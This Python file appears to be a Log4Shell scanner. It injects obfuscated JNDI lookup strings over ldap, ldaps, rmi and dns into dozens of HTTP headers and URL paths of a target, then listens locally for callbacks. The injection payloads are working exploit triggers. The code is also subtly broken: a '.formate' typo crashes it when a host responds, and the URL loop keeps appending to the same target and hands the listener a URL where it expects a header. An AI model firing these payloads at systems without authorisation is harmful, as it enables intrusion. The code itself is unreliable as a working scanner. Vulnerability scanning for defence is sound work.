import argparse

import threading
import socket
import requests

import logging
from colorama import Fore,Style
### Handle Network interface to ip address
import netifaces

### Handle Ctrl+c
import signal
import sys

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
protocols_list = "ldap","ldaps","rmi","dns"


def print_info(message):
    format_msg = '[{}{}i{}] {}'.format(Style.BRIGHT,Fore.CYAN,Style.RESET_ALL,message)
    print(format_msg)
    logging.info(format_msg)
def print_success(message):
    format_msg = '[{}{}*{}] {}'.format(Style.BRIGHT,Fore.GREEN,Style.RESET_ALL,message)
    print(format_msg)
    logging.info(format_msg)
def print_warning(message):
    format_msg = '[{}{}!{}] {}'.format(Style.BRIGHT,Fore.YELLOW,Style.RESET_ALL,message)
    print(format_msg)
    logging.info(format_msg)
def print_error(message):
    format_msg = '[{}{}x{}] {}'.format(Style.BRIGHT,Fore.RED,Style.RESET_ALL,message)
    print(format_msg)
    logging.info(format_msg)

def signal_handler(sig, frame):
    print_info('You pressed Ctrl+C!')
    print_warning('Exiting...')
    sys.exit(0)

def http_request(target_url:str,header:dict)->int:
    try:
        r = requests.get(target_url, headers=header, verify=False)
    except requests.exceptions.ConnectionError as e:
        print_error("Fail to connect: {} !".format(target_url))
        print_error("{}".format(e))
        sys.exit(-1)

    if(r.status_code != 200):
        logging.error('------------------')
        logging.error("Url:            {}".format(target_url))
        logging.error("Header:         {}".format(str(header)))
        logging.error("Request return: {}".format(str(r.status_code)))
        logging.error('------------------')
    return r.status_code

def test_connection(target_url)->bool:
    status_code = http_request(target_url,{})
    if(status_code == 200):
        return True
    print_error("Server status code: {}".format(str(status_code)))
    return False
    

def thread_function(local_ip_address:str,port:int,header:dict):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcpServer:
        tcpServer.bind((local_ip_address, port))
        tcpServer.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        tcpServer.settimeout(5) # timeout for listening
        tcpServer.listen(1)
        stopped = False
        while not stopped:
            try: 
                conn, addr = tcpServer.accept()
                with conn:
                    print_success("Connection:        {}:{}".formate(addr[0],str(addr[1])))
                    print_success("Vulnerable header: {}".formate(str(header)))
                    print("--------------------------------------------------")
                    stopped = True
            except socket.timeout:
                stopped = True
                pass
            except:
                raise

def header_attack(local_ip_address:str,target_url:str)->None:
    port = 60000
    payload_header_list = "User-Agent","Accept-Encoding","Accept","Connection","Accept-Charset","Accept-Datetime","Accept-Language","Cache-Control","Cookie","DNT","Forwarded","Forwarded-For","Forwarded-For-Ip","Forwarded-Proto","From","Max-Forwards","Origin","Pragma","Referer","TE","True-Client-IP","Upgrade","Via","Warning","X-Api-Version","X-ATT-DeviceId","X-Correlation-ID","X-Csrf-Token","X-CSRFToken","X-Do-Not-Track","X-Foo","X-Foo-Bar","X-Forwarded","X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Port","X-Forwarded-Proto","X-Forwarded-Protocol","X-Forwarded-Scheme","X-Forwarded-Server","X-Forwarded-Ssl","X-Forwarder-For","X-Forward-For","X-Forward-Proto","X-Frame-Options","X-From","X-Geoip-Country","X-Http-Destinationurl","X-Http-Host-Override","X-Http-Method","X-HTTP-Method-Override","X-Http-Path-Override","X-Https","X-Htx-Agent","X-Hub-Signature","X-If-Unmodified-Since","X-Imbo-Test-Config","X-Insight","X-Ip","X-Ip-Trail","X-ProxyUser-Ip","X-Requested-With","X-Request-ID","X-UIDH","X-Wap-Profile","X-XSRF-TOKEN"

    for protocol in protocols_list:
        for payload_header in payload_header_list:
            header = {payload_header: "${${::-j}ndi:"+protocol+"://"+local_ip_address+":"+str(port)+"/qz8c0o1}"}
            thread_handle = threading.Thread(target=thread_function, args=(local_ip_address,port,header,))
            thread_handle.start()
            http_request(target_url,header)
            port += 1

def url_attack(local_ip_address:str,target_url:str)->None:
    port = 50000
    payload_dir_list = "/", "/a?foo="

    for protocol in protocols_list:
        payload = "${${::-j}ndi:"+protocol+"://"+local_ip_address+":"+str(port)+"/qz8c0o1}"

        for payload_dir in payload_dir_list:
            target_url += payload_dir + payload
            thread_handle = threading.Thread(target=thread_function, args=(local_ip_address,port,target_url,))
            thread_handle.start()
            http_request(target_url,{})
            port += 1

def get_ip_address(interface_name:str)->str:
    try:
        network_info = netifaces.ifaddresses(interface_name)
        if(network_info):
            return network_info[netifaces.AF_INET][0]['addr']
    except:
        print_error ("Interface {} not found !".format(interface_name))
        sys.exit(-1)

    print_error ("Interface {} invalid !".format(interface_name))
    sys.exit(-1)

def manage_arg()->tuple:
    parser = argparse.ArgumentParser(description='Log4shell - Vulnerability scanner for local network', usage='%(prog)s -u [full_URL] -i [interface]')
    parser.version = 'Log4shell local scan version: 0.0.1-Dev'

    parser.add_argument('-u','--url',  metavar=' [full_URL]', type=str, help='The full url', required=True)
    parser.add_argument('-i','--interface',  metavar=' [interface]', type=str,help='The network interface', default="tun0")

    parser.add_argument('-v', '--version', action='version', help='Show program\'s version number and exit')

    try:
        args = parser.parse_args()
    except:
        exit(0)

    l_ip_address = get_ip_address(args.interface)

    return args.url, l_ip_address

def MainBanner() -> None:
    print("\n\n  ██╗      ██████╗  ██████╗ ██╗  ██╗███████╗██╗  ██╗███████╗██╗     ██╗ ")
    print("  ██║     ██╔═══██╗██╔════╝ ██║  ██║██╔════╝██║  ██║██╔════╝██║     ██║     ")
    print("  ██║     ██║   ██║██║  ███╗███████║███████╗███████║█████╗  ██║     ██║     ")
    print("  ██║     ██║   ██║██║   ██║╚════██║╚════██║██╔══██║██╔══╝  ██║     ██║     ")
    print("  ███████╗╚██████╔╝╚██████╔╝     ██║███████║██║  ██║███████╗███████╗███████╗")
    print("  ╚══════╝ ╚═════╝  ╚═════╝      ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
    print("\n\n")

def main()->None:
    MainBanner()

    (target_url,local_ip_address) = manage_arg()
    print_info("Target URL address: {}".format(target_url))
    print_info("Local IP address:   {}\n".format(local_ip_address))


    # Do a basic request to see if the server respond !!!
    if(test_connection(target_url)):
        print("------------------- START SCAN -------------------")
        url_attack(local_ip_address,target_url)
        header_attack(local_ip_address,target_url)
        print("------------------- STOP  SCAN -------------------")
    else:
        sys.exit(-1)



if __name__ == '__main__':
    logging.basicConfig(filename='log4shell.log', encoding='utf-8',format='[%(levelname)s] [%(asctime)s]: %(message)s', datefmt='%m/%d/%Y %I:%M:%S', level=logging.DEBUG)

    signal.signal(signal.SIGINT, signal_handler)
    logging.info('Started')
    main()
    logging.info('Finished')